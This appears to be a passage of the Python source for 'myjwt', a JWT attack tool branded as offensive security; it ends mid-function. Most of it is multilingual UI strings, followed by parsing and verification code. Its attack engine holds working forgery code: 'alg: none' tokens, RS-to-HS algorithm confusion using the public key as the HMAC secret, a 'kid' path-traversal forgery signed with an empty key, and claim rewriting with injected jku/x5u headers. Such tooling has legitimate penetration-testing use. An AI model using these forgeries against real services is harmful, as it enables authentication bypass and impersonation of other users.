#!/usr/bin/env python3
"""
myjwt - JWT Security Testing Framework
BY HACKITA - OFFENSIVE SECURITY
https://hackita.it/articoli/jwt/
"""
import argparse
import base64
import binascii
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.request
import urllib.error
import ssl
from datetime import datetime, timezone

# --- HACKITA BRANDING COLORS ---
RED    = "\033[38;5;196m"  # Hackita Bright Red
DRED   = "\033[38;5;88m"   # Hackita Dark Red
WHITE  = "\033[38;5;255m"  # Pure White
BLACK  = "\033[38;5;236m"  # Dark Grey
GREEN  = "\033[38;5;46m"   # Green
YELLOW = "\033[38;5;226m"  # Yellow
DIM    = "\033[2m"         # Dim text
RESET  = "\033[0m"
BOLD   = "\033[1m"

VERSION = "4.0"
CURRENT_LANG = "en"

# --- TRANSLATIONS (Cleaned, no hardcoded tags) ---
TRANSLATIONS = {
    "en": {
        "vuln_analysis": "[*] VULNERABILITY ANALYSIS",
        "no_issues": "[+] No obvious issues found.",
        "missing_exp": "Missing 'exp' (expiration) claim",
        "missing_iss": "Missing 'iss' (issuer) claim",
        "missing_aud": "Missing 'aud' (audience) claim",
        "hmac_sym": "Symmetric HMAC ({alg}) - secret strength is crucial",
        "asym_info": "Asymmetric algorithm ({alg})",
        "missing_alg": "Missing 'alg' in header",
        "alg_none": "Algorithm 'none' is used (Unsecured token)",
        "invalid_exp": "'exp' is not a valid NumericDate",
        "token_expired": "Token is expired",
        "long_lifetime": "Token lifetime is very long ({hours} hours)",
        "future_iat": "Token issued in the future ('iat')",
        "kid_traversal": "Potential 'kid' path traversal",
        "kid_sqli": "Potential 'kid' SQL injection",
        "jku_present": "'jku' present: {url} (Check SSRF/Trust)",
        "x5u_present": "'x5u' present: {url} (Check SSRF/Trust)",
        "jwk_present": "'jwk' embedded key present",
        "x5c_present": "'x5c' embedded cert chain present",
        "sensitive_claim": "Potential sensitive claim: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TOKEN TYPE: {type}",
        "parse_error": "[!] Parse Error: {error}",
        "jwe_encrypted": "[*] JWE Payload is encrypted.",
        "duplicate_keys": "[!] Duplicate keys detected: {keys}",
        "attack_mode": "[*] ATTACK MODE: {mode}",
        "attack_failed": "[!] Attack Failed: {error}",
        "forged_token": "[+] Forged Token:",
        "verification": "[*] VERIFICATION",
        "sig_valid": "[+] Signature VALID",
        "sig_invalid": "[!] Signature INVALID",
        "verification_error": "[!] Verification Error: {error}",
        "cracking": "[*] CRACKING HMAC SECRET",
        "secret_found": "[+] Secret found: {secret}",
        "secret_not_found": "[!] No secret found in wordlist.",
        "error": "[!] Error: {error}",
        "jwks_fetching": "[*] Fetching JWKS from {url}...",
        "jwks_found": "[+] Found {count} keys.",
        "jwks_private_key": "[!] WARNING: Private key material found (parameter 'd')!",
        "jwks_error": "[!] Error fetching JWKS: {error}",
        "http_testing": "[*] Testing HTTP Endpoint: {method} {url}",
        "http_mutated": "Mutated Status: {status} | Length: {length}",
        "http_baseline": "Baseline Status: {status} | Length: {length}",
        "http_identical": "[!] Response identical to baseline. No bypass.",
        "http_diff": "[+] Different response! Possible bypass.",
        "http_suspicious": "[?] Different response, investigate manually.",
        "http_error": "[!] HTTP Error: {error}",
        "invalid_base64": "Invalid Base64URL characters in segment",
        "invalid_length": "Invalid Base64URL length",
        "base64_error": "Base64URL decode failed: {error}",
        "invalid_json": "Invalid JSON: {error}",
        "invalid_json_nan": "Invalid JSON (NaN or Infinity found)",
        "expected_parts": "Expected 3 (JWS) or 5 (JWE) parts, got {parts}",
        "no_jwt": "No JWT found in input",
        "unsupported_hmac": "Unsupported HMAC alg: {alg}",
        "crypto_missing": "Missing 'cryptography' library. pip install cryptography",
        "requests_missing": "[!] 'requests' library required for HTTP testing. pip install requests",
        "unsupported_asym": "Unsupported asymmetric alg: {alg}",
        "cannot_forge_secret": "Cannot forge with secret for alg: {alg}",
        "jwe_crack": "JWE cannot be cracked this way",
        "not_hmac": "Not HMAC: {alg}",
        "wordlist_error": "Cannot read wordlist: {error}",
        "pubkey_required": "--pubkey required for confusion",
        "secret_required": "-k/--secret required for forge",
        "pubkey_load_error": "Failed to load public key: {error}",
        "invalid_ecdsa_len": "Invalid ECDSA signature length",
    },
    "it": {
        "vuln_analysis": "[*] ANALISI VULNERABILITÀ",
        "no_issues": "[+] Nessun problema evidente trovato.",
        "missing_exp": "Manca il claim 'exp' (scadenza)",
        "missing_iss": "Manca il claim 'iss' (emittente)",
        "missing_aud": "Manca il claim 'aud' (destinatario)",
        "hmac_sym": "HMAC Simmetrico ({alg}) - la robustezza del segreto è cruciale",
        "asym_info": "Algoritmo asimmetrico ({alg})",
        "missing_alg": "Manca 'alg' nell'header",
        "alg_none": "L'algoritmo 'none' è in uso (Token non sicuro)",
        "invalid_exp": "'exp' non è una NumericDate valida",
        "token_expired": "Il token è scaduto",
        "long_lifetime": "La durata del token è molto lunga ({hours} ore)",
        "future_iat": "Token emesso nel futuro ('iat')",
        "kid_traversal": "Potenziale path traversal in 'kid'",
        "kid_sqli": "Potenziale SQL injection in 'kid'",
        "jku_present": "'jku' presente: {url} (Controlla SSRF/Trust)",
        "x5u_present": "'x5u' presente: {url} (Controlla SSRF/Trust)",
        "jwk_present": "Chiave incorporata 'jwk' presente",
        "x5c_present": "Catena di certificati incorporata 'x5c' presente",
        "sensitive_claim": "Potenziale claim sensibile: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TIPO TOKEN: {type}",
        "parse_error": "[!] Errore di Parsing: {error}",
        "jwe_encrypted": "[*] Il payload JWE è cifrato.",
        "duplicate_keys": "[!] Chiavi duplicate rilevate: {keys}",
        "attack_mode": "[*] MODALITÀ ATTACCO: {mode}",
        "attack_failed": "[!] Attacco Fallito: {error}",
        "forged_token": "[+] Token Contraffatto:",
        "verification": "[*] VERIFICA",
        "sig_valid": "[+] Firma VALIDA",
        "sig_invalid": "[!] Firma NON VALIDA",
        "verification_error": "[!] Errore di Verifica: {error}",
        "cracking": "[*] CRACKING SEGRETO HMAC",
        "secret_found": "[+] Segreto trovato: {secret}",
        "secret_not_found": "[!] Nessun segreto trovato nella wordlist.",
        "error": "[!] Errore: {error}",
        "jwks_fetching": "[*] Recupero JWKS da {url}...",
        "jwks_found": "[+] Trovate {count} chiavi.",
        "jwks_private_key": "[!] ATTENZIONE: Materiale della chiave privata trovato (parametro 'd')!",
        "jwks_error": "[!] Errore nel recupero JWKS: {error}",
        "http_testing": "[*] Test Endpoint HTTP: {method} {url}",
        "http_mutated": "Stato Mutato: {status} | Lunghezza: {length}",
        "http_baseline": "Stato Baseline: {status} | Lunghezza: {length}",
        "http_identical": "[!] Risposta identica alla baseline. Nessun bypass.",
        "http_diff": "[+] Risposta diversa! Possibile bypass.",
        "http_suspicious": "[?] Risposta diversa, investigare manualmente.",
        "http_error": "[!] Errore HTTP: {error}",
        "invalid_base64": "Caratteri Base64URL non validi nel segmento",
        "invalid_length": "Lunghezza Base64URL non valida",
        "base64_error": "Decodifica Base64URL fallita: {error}",
        "invalid_json": "JSON non valido: {error}",
        "invalid_json_nan": "JSON non valido (trovato NaN o Infinity)",
        "expected_parts": "Attese 3 (JWS) o 5 (JWE) parti, trovate {parts}",
        "no_jwt": "Nessun JWT trovato nell'input",
        "unsupported_hmac": "Algoritmo HMAC non supportato: {alg}",
        "crypto_missing": "Libreria 'cryptography' mancante. pip install cryptography",
        "requests_missing": "[!] Libreria 'requests' richiesta per il test HTTP. pip install requests",
        "unsupported_asym": "Algoritmo asimmetrico non supportato: {alg}",
        "cannot_forge_secret": "Impossibile contraffare con segreto per alg: {alg}",
        "jwe_crack": "JWE non può essere craccato in questo modo",
        "not_hmac": "Non è HMAC: {alg}",
        "wordlist_error": "Impossibile leggere la wordlist: {error}",
        "pubkey_required": "--pubkey richiesto per la confusione",
        "secret_required": "-k/--secret richiesto per la contraffazione",
        "pubkey_load_error": "Impossibile caricare la chiave pubblica: {error}",
        "invalid_ecdsa_len": "Lunghezza firma ECDSA non valida",
    },
    "es": {
        "vuln_analysis": "[*] ANÁLISIS DE VULNERABILIDADES",
        "no_issues": "[+] No se encontraron problemas obvios.",
        "missing_exp": "Falta el claim 'exp' (expiración)",
        "missing_iss": "Falta el claim 'iss' (emisor)",
        "missing_aud": "Falta el claim 'aud' (audiencia)",
        "hmac_sym": "HMAC Simétrico ({alg}) - la fuerza del secreto es crucial",
        "asym_info": "Algoritmo asimétrico ({alg})",
        "missing_alg": "Falta 'alg' en el header",
        "alg_none": "Se usa el algoritmo 'none' (Token inseguro)",
        "invalid_exp": "'exp' no es una NumericDate válida",
        "token_expired": "El token ha expirado",
        "long_lifetime": "La vida útil del token es muy larga ({hours} horas)",
        "future_iat": "Token emitido en el futuro ('iat')",
        "kid_traversal": "Posible path traversal en 'kid'",
        "kid_sqli": "Posible inyección SQL en 'kid'",
        "jku_present": "'jku' presente: {url} (Verificar SSRF/Confianza)",
        "x5u_present": "'x5u' presente: {url} (Verificar SSRF/Confianza)",
        "jwk_present": "Clave incrustada 'jwk' presente",
        "x5c_present": "Cadena de certificados incrustada 'x5c' presente",
        "sensitive_claim": "Posible claim sensible: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TIPO DE TOKEN: {type}",
        "parse_error": "[!] Error de Parseo: {error}",
        "jwe_encrypted": "[*] El payload JWE está cifrado.",
        "duplicate_keys": "[!] Claves duplicadas detectadas: {keys}",
        "attack_mode": "[*] MODO ATAQUE: {mode}",
        "attack_failed": "[!] Ataque Fallido: {error}",
        "forged_token": "[+] Token Falsificado:",
        "verification": "[*] VERIFICACIÓN",
        "sig_valid": "[+] Firma VÁLIDA",
        "sig_invalid": "[!] Firma INVÁLIDA",
        "verification_error": "[!] Error de Verificación: {error}",
        "cracking": "[*] CRACKEANDO SECRETO HMAC",
        "secret_found": "[+] Secreto encontrado: {secret}",
        "secret_not_found": "[!] No se encontró ningún secreto en la wordlist.",
        "error": "[!] Error: {error}",
        "jwks_fetching": "[*] Obteniendo JWKS de {url}...",
        "jwks_found": "[+] Encontradas {count} claves.",
        "jwks_private_key": "[!] ADVERTENCIA: ¡Material de clave privada encontrado (parámetro 'd')!",
        "jwks_error": "[!] Error al obtener JWKS: {error}",
        "http_testing": "[*] Probando Endpoint HTTP: {method} {url}",
        "http_mutated": "Estado Mutado: {status} | Longitud: {length}",
        "http_baseline": "Estado Baseline: {status} | Longitud: {length}",
        "http_identical": "[!] Respuesta idéntica a la baseline. Sin bypass.",
        "http_diff": "[+] ¡Respuesta diferente! Posible bypass.",
        "http_suspicious": "[?] Respuesta diferente, investigar manualmente.",
        "http_error": "[!] Error HTTP: {error}",
        "invalid_base64": "Caracteres Base64URL inválidos en el segmento",
        "invalid_length": "Longitud Base64URL inválida",
        "base64_error": "Fallo en decodificación Base64URL: {error}",
        "invalid_json": "JSON inválido: {error}",
        "invalid_json_nan": "JSON inválido (se encontró NaN o Infinity)",
        "expected_parts": "Se esperaban 3 (JWS) o 5 (JWE) partes, se encontraron {parts}",
        "no_jwt": "No se encontró ningún JWT en la entrada",
        "unsupported_hmac": "Algoritmo HMAC no soportado: {alg}",
        "crypto_missing": "Falta la librería 'cryptography'. pip install cryptography",
        "requests_missing": "[!] Se requiere la librería 'requests' para pruebas HTTP. pip install requests",
        "unsupported_asym": "Algoritmo asimétrico no soportado: {alg}",
        "cannot_forge_secret": "No se puede falsificar con secreto para alg: {alg}",
        "jwe_crack": "JWE no se puede crackear de esta manera",
        "not_hmac": "No es HMAC: {alg}",
        "wordlist_error": "No se puede leer la wordlist: {error}",
        "pubkey_required": "Se requiere --pubkey para la confusión",
        "secret_required": "Se requiere -k/--secret para falsificar",
        "pubkey_load_error": "Fallo al cargar la clave pública: {error}",
        "invalid_ecdsa_len": "Longitud de firma ECDSA inválida",
    },
    "pt": {
        "vuln_analysis": "[*] ANÁLISE DE VULNERABILIDADES",
        "no_issues": "[+] Nenhum problema óbvio encontrado.",
        "missing_exp": "Falta o claim 'exp' (expiração)",
        "missing_iss": "Falta o claim 'iss' (emissor)",
        "missing_aud": "Falta o claim 'aud' (audiência)",
        "hmac_sym": "HMAC Simétrico ({alg}) - a força do segredo é crucial",
        "asym_info": "Algoritmo assimétrico ({alg})",
        "missing_alg": "Falta 'alg' no header",
        "alg_none": "O algoritmo 'none' está em uso (Token inseguro)",
        "invalid_exp": "'exp' não é uma NumericDate válida",
        "token_expired": "O token expirou",
        "long_lifetime": "O tempo de vida do token é muito longo ({hours} horas)",
        "future_iat": "Token emitido no futuro ('iat')",
        "kid_traversal": "Potencial path traversal em 'kid'",
        "kid_sqli": "Potencial injeção SQL em 'kid'",
        "jku_present": "'jku' presente: {url} (Verificar SSRF/Confiança)",
        "x5u_present": "'x5u' presente: {url} (Verificar SSRF/Confiança)",
        "jwk_present": "Chave incorporada 'jwk' presente",
        "x5c_present": "Cadeia de certificados incorporada 'x5c' presente",
        "sensitive_claim": "Potencial claim sensível: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TIPO DE TOKEN: {type}",
        "parse_error": "[!] Erro de Parsing: {error}",
        "jwe_encrypted": "[*] O payload JWE está criptografado.",
        "duplicate_keys": "[!] Chaves duplicadas detectadas: {keys}",
        "attack_mode": "[*] MODO ATAQUE: {mode}",
        "attack_failed": "[!] Ataque Falhou: {error}",
        "forged_token": "[+] Token Falsificado:",
        "verification": "[*] VERIFICAÇÃO",
        "sig_valid": "[+] Assinatura VÁLIDA",
        "sig_invalid": "[!] Assinatura INVÁLIDA",
        "verification_error": "[!] Erro de Verificação: {error}",
        "cracking": "[*] CRACKEANDO SEGREDO HMAC",
        "secret_found": "[+] Segredo encontrado: {secret}",
        "secret_not_found": "[!] Nenhum segredo encontrado na wordlist.",
        "error": "[!] Erro: {error}",
        "jwks_fetching": "[*] Obtendo JWKS de {url}...",
        "jwks_found": "[+] Encontradas {count} chaves.",
        "jwks_private_key": "[!] AVISO: Material de chave privada encontrado (parâmetro 'd')!",
        "jwks_error": "[!] Erro ao obter JWKS: {error}",
        "http_testing": "[*] Testando Endpoint HTTP: {method} {url}",
        "http_mutated": "Status Mutado: {status} | Comprimento: {length}",
        "http_baseline": "Status Baseline: {status} | Comprimento: {length}",
        "http_identical": "[!] Resposta idêntica à baseline. Sem bypass.",
        "http_diff": "[+] Resposta diferente! Possível bypass.",
        "http_suspicious": "[?] Resposta diferente, investigar manualmente.",
        "http_error": "[!] Erro HTTP: {error}",
        "invalid_base64": "Caracteres Base64URL inválidos no segmento",
        "invalid_length": "Comprimento Base64URL inválido",
        "base64_error": "Falha na decodificação Base64URL: {error}",
        "invalid_json": "JSON inválido: {error}",
        "invalid_json_nan": "JSON inválido (NaN ou Infinity encontrados)",
        "expected_parts": "Esperadas 3 (JWS) ou 5 (JWE) partes, encontradas {parts}",
        "no_jwt": "Nenhum JWT encontrado na entrada",
        "unsupported_hmac": "Algoritmo HMAC não suportado: {alg}",
        "crypto_missing": "Biblioteca 'cryptography' ausente. pip install cryptography",
        "requests_missing": "[!] Biblioteca 'requests' necessária para testes HTTP. pip install requests",
        "unsupported_asym": "Algoritmo assimétrico não suportado: {alg}",
        "cannot_forge_secret": "Não é possível falsificar com segredo para alg: {alg}",
        "jwe_crack": "JWE não pode ser crackeado desta forma",
        "not_hmac": "Não é HMAC: {alg}",
        "wordlist_error": "Não é possível ler a wordlist: {error}",
        "pubkey_required": "--pubkey necessário para confusão",
        "secret_required": "-k/--secret necessário para falsificação",
        "pubkey_load_error": "Falha ao carregar chave pública: {error}",
        "invalid_ecdsa_len": "Comprimento de assinatura ECDSA inválido",
    },
    "de": {
        "vuln_analysis": "[*] SCHWACHSTELLENANALYSE",
        "no_issues": "[+] Keine offensichtlichen Probleme gefunden.",
        "missing_exp": "'exp' (Ablauf) Claim fehlt",
        "missing_iss": "'iss' (Aussteller) Claim fehlt",
        "missing_aud": "'aud' (Zielgruppe) Claim fehlt",
        "hmac_sym": "Symmetrisches HMAC ({alg}) - die Stärke des Geheimnisses ist entscheidend",
        "asym_info": "Asymmetrischer Algorithmus ({alg})",
        "missing_alg": "'alg' im Header fehlt",
        "alg_none": "Algorithmus 'none' wird verwendet (Unsicheres Token)",
        "invalid_exp": "'exp' ist kein gültiges NumericDate",
        "token_expired": "Token ist abgelaufen",
        "long_lifetime": "Token-Lebensdauer ist sehr lang ({hours} Stunden)",
        "future_iat": "Token in der Zukunft ausgestellt ('iat')",
        "kid_traversal": "Möglicher 'kid' Path Traversal",
        "kid_sqli": "Mögliche 'kid' SQL-Injection",
        "jku_present": "'jku' vorhanden: {url} (SSRF/Vertrauen prüfen)",
        "x5u_present": "'x5u' vorhanden: {url} (SSRF/Vertrauen prüfen)",
        "jwk_present": "Eingebetteter Schlüssel 'jwk' vorhanden",
        "x5c_present": "Eingebettete Zertifikatskette 'x5c' vorhanden",
        "sensitive_claim": "Möglicher sensibler Claim: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TOKEN-TYP: {type}",
        "parse_error": "[!] Parsing-Fehler: {error}",
        "jwe_encrypted": "[*] JWE Payload ist verschlüsselt.",
        "duplicate_keys": "[!] Doppelte Schlüssel erkannt: {keys}",
        "attack_mode": "[*] ANGRIFFSMODUS: {mode}",
        "attack_failed": "[!] Angriff fehlgeschlagen: {error}",
        "forged_token": "[+] Gefälschtes Token:",
        "verification": "[*] VERIFIZIERUNG",
        "sig_valid": "[+] Signatur GÜLTIG",
        "sig_invalid": "[!] Signatur UNGÜLTIG",
        "verification_error": "[!] Verifizierungsfehler: {error}",
        "cracking": "[*] HMAC GEHEIMNIS CRACKEN",
        "secret_found": "[+] Geheimnis gefunden: {secret}",
        "secret_not_found": "[!] Kein Geheimnis in der Wordlist gefunden.",
        "error": "[!] Fehler: {error}",
        "jwks_fetching": "[*] Abrufen von JWKS von {url}...",
        "jwks_found": "[+] {count} Schlüssel gefunden.",
        "jwks_private_key": "[!] WARNUNG: Privates Schlüsselmaterial gefunden (Parameter 'd')!",
        "jwks_error": "[!] Fehler beim Abrufen von JWKS: {error}",
        "http_testing": "[*] Teste HTTP-Endpunkt: {method} {url}",
        "http_mutated": "Mutierter Status: {status} | Länge: {length}",
        "http_baseline": "Baseline-Status: {status} | Länge: {length}",
        "http_identical": "[!] Antwort identisch mit Baseline. Kein Bypass.",
        "http_diff": "[+] Unterschiedliche Antwort! Möglicher Bypass.",
        "http_suspicious": "[?] Unterschiedliche Antwort, manuell untersuchen.",
        "http_error": "[!] HTTP-Fehler: {error}",
        "invalid_base64": "Ungültige Base64URL-Zeichen im Segment",
        "invalid_length": "Ungültige Base64URL-Länge",
        "base64_error": "Base64URL-Dekodierung fehlgeschlagen: {error}",
        "invalid_json": "Ungültiges JSON: {error}",
        "invalid_json_nan": "Ungültiges JSON (NaN oder Infinity gefunden)",
        "expected_parts": "3 (JWS) oder 5 (JWE) Teile erwartet, {parts} gefunden",
        "no_jwt": "Kein JWT in der Eingabe gefunden",
        "unsupported_hmac": "Nicht unterstützter HMAC-Algorithmus: {alg}",
        "crypto_missing": "Bibliothek 'cryptography' fehlt. pip install cryptography",
        "requests_missing": "[!] Bibliothek 'requests' für HTTP-Tests erforderlich. pip install requests",
        "unsupported_asym": "Nicht unterstützter asymmetrischer Algorithmus: {alg}",
        "cannot_forge_secret": "Kann nicht mit Geheimnis für alg fälschen: {alg}",
        "jwe_crack": "JWE kann nicht auf diese Weise geknackt werden",
        "not_hmac": "Kein HMAC: {alg}",
        "wordlist_error": "Wordlist kann nicht gelesen werden: {error}",
        "pubkey_required": "--pubkey für Konfusion erforderlich",
        "secret_required": "-k/--secret zum Fälschen erforderlich",
        "pubkey_load_error": "Öffentlicher Schlüssel konnte nicht geladen werden: {error}",
        "invalid_ecdsa_len": "Ungültige ECDSA-Signaturlänge",
    },
    "fr": {
        "vuln_analysis": "[*] ANALYSE DES VULNÉRABILITÉS",
        "no_issues": "[+] Aucun problème évident trouvé.",
        "missing_exp": "Claim 'exp' (expiration) manquant",
        "missing_iss": "Claim 'iss' (émetteur) manquant",
        "missing_aud": "Claim 'aud' (audience) manquant",
        "hmac_sym": "HMAC Symétrique ({alg}) - la force du secret est cruciale",
        "asym_info": "Algorithme asymétrique ({alg})",
        "missing_alg": "'alg' manquant dans l'en-tête",
        "alg_none": "L'algorithme 'none' est utilisé (Token non sécurisé)",
        "invalid_exp": "'exp' n'est pas une NumericDate valide",
        "token_expired": "Le token est expiré",
        "long_lifetime": "La durée de vie du token est très longue ({hours} heures)",
        "future_iat": "Token émis dans le futur ('iat')",
        "kid_traversal": "Path traversal potentiel dans 'kid'",
        "kid_sqli": "Injection SQL potentielle dans 'kid'",
        "jku_present": "'jku' présent : {url} (Vérifier SSRF/Confiance)",
        "x5u_present": "'x5u' présent : {url} (Vérifier SSRF/Confiance)",
        "jwk_present": "Clé intégrée 'jwk' présente",
        "x5c_present": "Chaîne de certificats intégrée 'x5c' présente",
        "sensitive_claim": "Claim sensible potentiel : '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "token_type": "[*] TYPE DE TOKEN : {type}",
        "parse_error": "[!] Erreur d'analyse : {error}",
        "jwe_encrypted": "[*] Le payload JWE est chiffré.",
        "duplicate_keys": "[!] Clés dupliquées détectées : {keys}",
        "attack_mode": "[*] MODE ATTAQUE : {mode}",
        "attack_failed": "[!] Attaque échouée : {error}",
        "forged_token": "[+] Token Falsifié :",
        "verification": "[*] VÉRIFICATION",
        "sig_valid": "[+] Signature VALIDE",
        "sig_invalid": "[!] Signature INVALIDE",
        "verification_error": "[!] Erreur de vérification : {error}",
        "cracking": "[*] CRAQUAGE DU SECRET HMAC",
        "secret_found": "[+] Secret trouvé : {secret}",
        "secret_not_found": "[!] Aucun secret trouvé dans la wordlist.",
        "error": "[!] Erreur : {error}",
        "jwks_fetching": "[*] Récupération du JWKS depuis {url}...",
        "jwks_found": "[+] {count} clés trouvées.",
        "jwks_private_key": "[!] AVERTISSEMENT : Matériel de clé privée trouvé (paramètre 'd') !",
        "jwks_error": "[!] Erreur lors de la récupération du JWKS : {error}",
        "http_testing": "[*] Test de l'Endpoint HTTP : {method} {url}",
        "http_mutated": "Statut Muté : {status} | Longueur : {length}",
        "http_baseline": "Statut Baseline : {status} | Longueur : {length}",
        "http_identical": "[!] Réponse identique à la baseline. Pas de bypass.",
        "http_diff": "[+] Réponse différente ! Bypass possible.",
        "http_suspicious": "[?] Réponse différente, à investiguer manuellement.",
        "http_error": "[!] Erreur HTTP : {error}",
        "invalid_base64": "Caractères Base64URL invalides dans le segment",
        "invalid_length": "Longueur Base64URL invalide",
        "base64_error": "Échec du décodage Base64URL : {error}",
        "invalid_json": "JSON invalide : {error}",
        "invalid_json_nan": "JSON invalide (NaN ou Infinity trouvé)",
        "expected_parts": "3 (JWS) ou 5 (JWE) parties attendues, {parts} trouvées",
        "no_jwt": "Aucun JWT trouvé dans l'entrée",
        "unsupported_hmac": "Algorithme HMAC non supporté : {alg}",
        "crypto_missing": "Bibliothèque 'cryptography' manquante. pip install cryptography",
        "requests_missing": "[!] Bibliothèque 'requests' requise pour les tests HTTP. pip install requests",
        "unsupported_asym": "Algorithme asymétrique non supporté : {alg}",
        "cannot_forge_secret": "Impossible de falsifier avec un secret pour alg : {alg}",
        "jwe_crack": "JWE ne peut pas être craqué de cette manière",
        "not_hmac": "Pas HMAC : {alg}",
        "wordlist_error": "Impossible de lire la wordlist : {error}",
        "pubkey_required": "--pubkey requis pour la confusion",
        "secret_required": "-k/--secret requis pour falsifier",
        "pubkey_load_error": "Échec du chargement de la clé publique : {error}",
        "invalid_ecdsa_len": "Longueur de signature ECDSA invalide",
    }
}

def t(key, **kwargs):
    msg = TRANSLATIONS.get(CURRENT_LANG, TRANSLATIONS["en"]).get(key)
    if not msg:
        msg = TRANSLATIONS["en"].get(key, key)
    if kwargs:
        return msg.format(**kwargs)
    return msg

# --- OPTIONAL DEPENDENCIES ---
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa, ec, ed25519, ed448, utils
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

class JwtError(Exception):
    pass

# --------------------------------------------------------- PARSING & DECODE --
def b64url_decode(segment):
    if not segment:
        return b""
    if not re.match(r"^[A-Za-z0-9_\-]+$", segment):
        raise JwtError(t("invalid_base64"))
    if len(segment) % 4 == 1:
        raise JwtError(t("invalid_length"))
    padded = segment + "=" * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(padded)
    except Exception as e:
        raise JwtError(t("base64_error", error=e))

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def strict_json_loads(data):
    try:
        text = data.decode("utf-8")
        if re.search(r'\b(NaN|Infinity)\b', text):
            raise JwtError(t("invalid_json_nan"))
        duplicates = []
        def hook(pairs):
            d = {}
            for k, v in pairs:
                if k in d: duplicates.append(k)
                d[k] = v
            return d
        return json.loads(text, object_pairs_hook=hook), duplicates
    except json.JSONDecodeError as e:
        raise JwtError(t("invalid_json", error=e))

def parse_token(token):
    parts = token.split(".")
    if len(parts) not in (3, 5):
        raise JwtError(t("expected_parts", parts=len(parts)))
    
    header_raw = b64url_decode(parts[0])
    header, dup_h = strict_json_loads(header_raw)
    
    if len(parts) == 5:
        return {"raw": token, "parts": parts, "header": header, "type": "JWE", "duplicates": dup_h}
    
    payload_raw = b64url_decode(parts[1])
    payload, dup_p = strict_json_loads(payload_raw)
    sig_raw = b64url_decode(parts[2])
    
    return {
        "raw": token, "parts": parts, "header": header, "payload": payload,
        "signature": sig_raw, "type": "JWS", "duplicates": dup_h + dup_p
    }

def extract_token(raw):
    raw = raw.strip()
    candidates = re.findall(r"[A-Za-z0-9_\-+/]+(?:\.[A-Za-z0-9_\-+/]*){2,4}", raw)
    if not candidates:
        raise JwtError(t("no_jwt"))
    return max(candidates, key=len)

# --------------------------------------------------------- CRYPTO ENGINE --
def verify_hmac(info, secret):
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS: raise JwtError(t("unsupported_hmac", alg=alg))
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    return hmac.compare_digest(expected, info["signature"])

def verify_asymmetric(info, pub_key_bytes):
    if not HAS_CRYPTO:
        raise JwtError(t("crypto_missing"))
    alg = info["header"].get("alg")
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    
    try:
        public_key = serialization.load_pem_public_key(pub_key_bytes)
    except Exception as e:
        raise JwtError(t("pubkey_load_error", error=e))

    try:
        if alg.startswith("RS"):
            hash_alg = hashes.SHA256() if alg == "RS256" else hashes.SHA384() if alg == "RS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PKCS1v15(), hash_alg)
        elif alg.startswith("PS"):
            hash_alg = hashes.SHA256() if alg == "PS256" else hashes.SHA384() if alg == "PS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PSS(mgf=padding.MGF1(hash_alg), salt_length=hash_alg.digest_size), hash_alg)
        elif alg.startswith("ES"):
            hash_alg = hashes.SHA256() if alg == "ES256" else hashes.SHA384() if alg == "ES384" else hashes.SHA512()
            key_size = public_key.key_size
            num_bytes = (key_size + 7) // 8
            if len(info["signature"]) != 2 * num_bytes:
                raise JwtError(t("invalid_ecdsa_len"))
            r = int.from_bytes(info["signature"][:num_bytes], 'big')
            s = int.from_bytes(info["signature"][num_bytes:], 'big')
            der_sig = utils.encode_dss_signature(r, s)
            public_key.verify(der_sig, signing_input, ec.ECDSA(hash_alg))
        elif alg in ("EdDSA", "Ed25519", "Ed448"):
            public_key.verify(info["signature"], signing_input)
        else:
            raise JwtError(t("unsupported_asym", alg=alg))
        return True
    except Exception:
        return False

# --------------------------------------------------------- ATTACK ENGINE --
def forge_none(info):
    header = dict(info["header"]); header["alg"] = "none"
    return f"{b64url_encode(json.dumps(header, separators=(',', ':')))}.{info['parts'][1]}."

def forge_confusion(info, pubkey_bytes):
    header = dict(info["header"]); header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_kid(info):
    header = dict(info["header"])
    header["alg"] = "HS256"
    header["kid"] = "../../../../../../dev/null"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
    header = dict(info["header"])
    payload = dict(info["payload"])
    
    if jku: header["jku"] = jku
    if x5u: header["x5u"] = x5u
    
    for assignment in claims_to_set:
        k, v_str = assignment.split("=", 1)
        try:
            v = json.loads(v_str)
        except json.JSONDecodeError:
            v = v_str
        payload[k] = v
        
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    alg = header.get("alg", "HS256")
    if alg in HMAC_ALGS:
